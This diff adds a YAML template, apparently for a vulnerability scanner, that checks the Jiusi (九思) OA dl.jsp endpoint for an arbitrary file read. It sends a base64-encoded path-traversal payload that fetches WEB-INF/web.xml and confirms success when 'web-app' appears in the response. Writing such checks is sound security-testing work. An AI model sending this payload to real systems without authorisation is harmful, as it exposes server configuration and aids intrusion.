@@ -1,0 +1,13 @@
+name: 九思OA-dl.jsp-任意文件读取
+description: >-
+  读取web.xml
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /jsoa/dl.jsp?JkZpbGVOYW1lPS4uLy4uLy4uL1dFQi1JTkYvd2ViLnhtbCZwYXRoPS9h
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    expression:
+      status: 200
+      body_all: ["web-app"]
